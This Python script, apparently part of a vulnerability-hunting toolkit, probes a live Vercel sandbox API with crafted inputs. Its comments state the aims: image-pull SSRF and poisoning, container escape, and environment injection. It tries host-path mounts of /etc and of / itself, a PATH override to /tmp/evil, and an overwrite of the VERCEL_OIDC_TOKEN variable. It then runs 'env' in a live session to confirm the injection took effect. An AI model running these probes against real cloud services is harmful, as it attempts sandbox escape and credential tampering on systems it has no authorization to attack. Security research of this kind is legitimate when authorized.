# -*- coding: utf-8 -*-
"""深挖: image 引用格式矩阵 + mounts value object schema 枚举 + env 注入验证
image 合法格式 -> 若支持外部 registry/URL -> 镜像拉取 SSRF/投毒面
mounts value object 字段 -> 若支持 hostPath -> 挂载逃逸面
"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

OUT = r'F:\scan\skills\out\_imgprobe.txt'
buf = []
def log(s):
    print(s, flush=True)
    buf.append(s)

def try_create(name, extra, tag, keep=False):
    body = {"projectId": PROJ, "name": name}
    body.update(extra)
    c, r = api("POST", "/v2/sandboxes?teamId=%s" % TEAM, body)
    log('[%s] %s | %s' % (tag, c, r[:400].replace('\n', ' ')))
    if c == 200 and not keep:
        time.sleep(1)
        api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (name, TEAM, PROJ))
        time.sleep(1)
    return c, r

def main():
    log('===== image reference matrix =====')
    imgs = [
        ("node:22", "img-node22"),            # 内置别名?
        ("node22", "img-node22-bare"),        # 无 tag
        ("node22:latest", "img-node22-latest"),
        ("node:22@sha256:abc", "img-digest"),
        ("docker.io/library/node:22", "img-dockerio"),
        ("index.docker.io/library/node:22", "img-indexdk"),
        ("registry-1.docker.io/library/node:22", "img-reg1"),
        ("public.ecr.aws/docker/library/node:22", "img-ecr"),
        ("ghcr.io/starship/starship:latest", "img-ghcr"),
        ("quay.io/prometheus/busybox:latest", "img-quay"),
        ("https://raw.githubusercontent.com/x/y/main/Dockerfile", "img-url"),
        ("img_abc123", "img-internal-id"),
        ("vercel/node22", "img-vercel"),
        ("vercel/sandbox/node22", "img-vercel2"),
        ("node", "img-node-bare"),
        ("library/node:22", "img-lib-node"),
    ]
    for i, (img, tag) in enumerate(imgs):
        try_create('imgx%d' % i, {"image": img}, tag)
        time.sleep(0.5)

    log('')
    log('===== mounts value object schema =====')
    mounts_cands = [
        ({"/mnt/x": {"hostPath": "/etc"}}, "m-hostPath"),
        ({"/mnt/x": {"source": "/etc"}}, "m-source"),
        ({"/mnt/x": {"src": "/etc"}}, "m-src"),
        ({"/mnt/x": {"path": "/etc"}}, "m-path"),
        ({"/mnt/x": {"host": "/etc"}}, "m-host"),
        ({"/mnt/x": {"type": "bind", "source": "/etc"}}, "m-type-bind"),
        ({"/mnt/x": {"driver": "local", "source": "/etc"}}, "m-driver"),
        ({"/mnt/x": {"readOnly": True}}, "m-readonly"),
        ({"/mnt/x": {"mode": "ro"}}, "m-mode"),
        ({"/mnt/x": {"value": "/etc"}}, "m-value"),
        ({"/mnt/x": {}}, "m-empty-obj"),
        ({"/etc": {"hostPath": "/etc"}}, "m-hostpath-same"),
        ({"/": {"hostPath": "/"}}, "m-root"),
    ]
    for i, (m, tag) in enumerate(mounts_cands):
        try_create('mtx%d' % i, {"mounts": m}, tag)
        time.sleep(0.5)

    log('')
    log('===== env injection verify =====')
    c, r = try_create('envtest1', {"env": {"FOO": "bar123", "PATH": "/tmp/evil", "VERCEL_OIDC_TOKEN": "HACKED"}}, 'env-create', keep=True)
    if c == 200:
        sid = json.loads(r)["sandbox"]["currentSessionId"]
        c2, r2 = api("POST", "/v2/sandboxes/sessions/%s/cmd?teamId=%s" % (sid, TEAM),
                     {"command": "env", "args": [], "wait": True, "logs": True, "timeout": 20000})
        log('[env-check] %s | %s' % (c2, r2[:800].replace('\n', ' ')))
        api("DELETE", "/v2/sandboxes/envtest1?teamId=%s&projectId=%s" % (TEAM, PROJ))

    log('DONE')
    open(OUT, 'w', encoding='utf-8').write('\n'.join(buf))
    log('saved -> %s' % OUT)

if __name__ == '__main__':
    main()
